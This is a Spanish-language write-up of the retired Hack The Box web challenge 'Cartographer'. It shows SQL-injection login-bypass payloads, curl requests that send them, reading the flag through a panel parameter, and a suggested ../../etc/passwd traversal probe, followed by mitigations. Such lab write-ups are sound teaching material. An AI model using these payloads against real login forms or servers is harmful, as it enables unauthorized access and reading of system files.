---
challenge: Cartographer
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, login-bypass, enumeration, php]
---

# Cartographer — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Login PHP con **SQL injection** clásica: `' OR '1'='1` entra sin credenciales. Dentro, el panel carga la sección con `panel.php?info=<valor>`, y basta pedir `info=flag` para que devuelva la flag. La fuerza bruta no lleva a ningún sitio; el reto es de inyección, no de diccionario.

## Enunciado y superficie

«Unos hackers están montando un servidor de mando y control. ¿Puedes entrar y ver qué traman?»

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

```bash
curl -s http://<IP>:<puerto>/ | head -40
```

Formulario `POST` con `username` y `password`. Antes de atacar, se comprueba si hay inyección:

```bash
curl -s -X POST http://<IP>:<puerto>/index.php \
  -d "username=admin'-- -&password=x" -i | head
```

Alternativas habituales:

```text
' OR '1'='1
'||' 1 '=' 1
admin' #
```

Si el servidor responde con redirección al panel, la consulta se está concatenando.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

Con sesión iniciada, la navegación usa un parámetro:

```text
http://<IP>:<puerto>/panel.php?info=home
```

El valor se usa para incluir la sección. Se prueba con `info=flag`:

```bash
curl -s -b 'PHPSESSID=<id>' "http://<IP>:<puerto>/panel.php?info=flag"
```

```text
HTB{<flag>}
```

Si `info` estuviera filtrando rutas, el mismo parámetro sirve para enumerar: `home`, `about`, `contact`, `flag`, `admin`… y para probar traversal (`../../etc/passwd`) cuando no hay allowlist.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Sesión**: el panel exige la cookie `PHPSESSID` del login; guardarla con `-c/-b`.
- **Fuerza bruta inútil**: `admin:admin`, `admin:password` no funcionan y los diccionarios tampoco.
- **Parámetro**: si `info` no responde, probar `page`, `view`, `file`; el nombre exacto se ve en los enlaces del panel.
- **Comillas**: `admin'-- -` necesita el espacio antes del guion en MySQL.

- Un `SELECT` concatenado en un login es bypass inmediato: no hace falta contraseña.
- El parámetro que elige «sección» suele ser también el que sirve la flag.
- Mitigación: consultas preparadas, comparación de hash en servidor y allowlist de secciones en lugar de include dinámico.

## Mitigaciones y detección

- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.
